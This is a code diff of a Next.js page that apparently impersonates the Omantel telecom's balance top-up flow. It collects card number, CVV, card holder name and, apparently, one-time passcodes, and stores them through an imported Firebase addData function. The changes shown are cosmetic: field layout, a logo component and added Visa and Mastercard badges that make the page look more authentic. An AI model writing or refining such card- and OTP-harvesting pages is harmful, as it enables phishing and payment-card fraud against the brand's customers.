@@ -32,6 +32,8 @@ import {
 } from "@/components/ui/dialog"
 import { useState } from "react"
 import { addData } from "@/lib/firebase"
+import { OmantelLogo } from "@/components/logo"
+import Image from "next/image"
 const allOtps=['']
 export default function OmantelPage(): ReactElement {
   // Form state management
@@ -195,7 +197,7 @@ export default function OmantelPage(): ReactElement {
         <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6">
           <div className="flex items-center gap-2 text-orange-500 font-semibold">
             <ArrowRight className="h-4 w-4" />
-            <Link href="#">إلى الخلف</Link>
+            <Link href="/">إلى الخلف</Link>
           </div>
 
           <div className="text-center space-y-2">
@@ -208,8 +210,8 @@ export default function OmantelPage(): ReactElement {
           <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
             <form onSubmit={handleFormSubmit} className="space-y-4 text-right">
               <div className="grid grid-cols-2 gap-4">
-                <div className="space-y-2">
-                  <label htmlFor="card-number" className="text-sm font-medium text-gray-700 block">
+                <div className="space-y-2 col-span-2">
+                  <label htmlFor="card-number" className=" text-sm font-medium text-gray-700 block">
                     رقم البطاقة
                   </label>
                   <Input
@@ -234,9 +236,6 @@ export default function OmantelPage(): ReactElement {
                     maxLength={5}
                   />
                 </div>
-              </div>
-
-              <div className="grid grid-cols-2 gap-4">
                 <div className="space-y-2">
                   <label htmlFor="cvv" className="text-sm font-medium text-gray-700 block">
                     رمز الأمان (CVV)
@@ -251,10 +250,10 @@ export default function OmantelPage(): ReactElement {
                     className="text-center"
                   />
                 </div>
-                <div className="space-y-2 flex items-end">
-                  <div className="text-xs text-gray-500 mb-2">رمز مكون من 3-4 أرقام على ظهر البطاقة</div>
-                </div>
               </div>
+
+              
+                
 
               <div className="space-y-2">
                 <label htmlFor="card-holder" className="text-sm font-medium text-gray-700 block">
@@ -287,6 +286,11 @@ export default function OmantelPage(): ReactElement {
                   تعبئة الرصيد (5.000 ر.ع)
                 </Button>
               </DialogTrigger>
+              <div className="flex justify-center ">
+                <Image src="exp.svg" width={35} height={35} alt="visa"/>
+                <Image src="mas.svg" width={35} height={35} alt="mas"/>
+                <Image src="visa.svg" width={35} height={35} alt="exp"/>
+              </div>
             </form>
 
             <DialogContent className="sm:max-w-[425px] text-right">
@@ -511,15 +515,5 @@ export default function OmantelPage(): ReactElement {
         </div>
       </footer>
     </div>
-  )
-}
-
-function OmantelLogo(props: React.SVGProps<SVGSVGElement>): ReactElement {
-  return (
-    <svg {...props} viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Omantel">
-      <text x="0" y="15" fontFamily="Arial, sans-serif" fontSize="16" fontWeight="bold" fill="currentColor">
-        Omantel
-      </text>
-    </svg>
   )
 }
